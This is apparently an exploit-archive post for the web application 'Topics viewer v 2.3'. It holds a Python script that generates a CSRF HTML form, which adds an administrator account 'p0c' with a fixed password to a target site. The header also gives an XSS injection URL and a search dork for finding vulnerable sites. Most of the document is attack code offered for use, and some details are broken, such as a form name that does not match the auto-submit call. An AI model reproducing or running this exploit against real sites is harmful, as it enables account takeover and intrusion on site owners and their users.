########################################################################
# Title    : Topics viewer v 2.3 csrf Add Admin and XSS
# Author   : Cyber-Crystal
# Version  : 2.3
# Homepage : http://nilehoster.com/default/topicsviewer
# Dork     : "Programmed by : Nilehoster.com"
# Tested on: Win/7
# Based on POC : http://vb.ehcommunity.com/showthread.php?t=70682
# CVE : 14 May 2012
#---------------------------------------------------------------------
# ^_^ > snc0pe | secure-x41 | Dmar al3noOoz | al-swisre || All
# 
#
# Xss Exploit is Here :
# http://localhost//admincp/edit_block.php?id=XSS

import sys
import string
import os


def banner():
	print &#039;&#039;&#039;
----------------------------------
Topics viewer v 2.3 csrf Add Admin
----------------------------------

[+] python Exploit.py http://www.exp.com  	
&#039;&#039;&#039;
if os.name == "nt":
	os.system("cls")
	os.system("color e")
else :
	os.system(&#039;clear&#039;)
	
if len(sys.argv) < 2:
	banner()
	sys.exit()
	
vic = sys.argv[1].replace("http://","").replace("/","")
file = open("Exploit.html", "w")


db = ("<html>\n"
"<body>\n"
"<form action=&#039;http://"+vic+"/admincp/main.php?op=add-admin&#039; method=&#039;post&#039; name=&#039;sdf&#039;>\n"
"<input type=&#039;text&#039; name=&#039;u_name&#039; value=&#039;p0c&#039; />\n"
"<input type=&#039;text&#039; name=&#039;u_m_pass&#039; value=&#039;1212&#039; />\n"
"<input type=&#039;text&#039; name=&#039;u_email&#039; value=&#039;p0c@p0c.com&#039; />\n"
"<input type=&#039;text&#039; name=&#039;verification&#039; value=&#039;101010&#039;/> <!-- Any number-->\n"
"<script>document.xss.submit();</script><br />\n"
"<input type=&#039;submit&#039; value=&#039;Exploit&#039;/>\n"
"</form>\n"
"</body>\n"
"</html>\n")
	
file.write(db)
print "Createing ...\n"
print "user Name And Password ...\n"
print "User : p0c \t Pass : 1212"

# The End



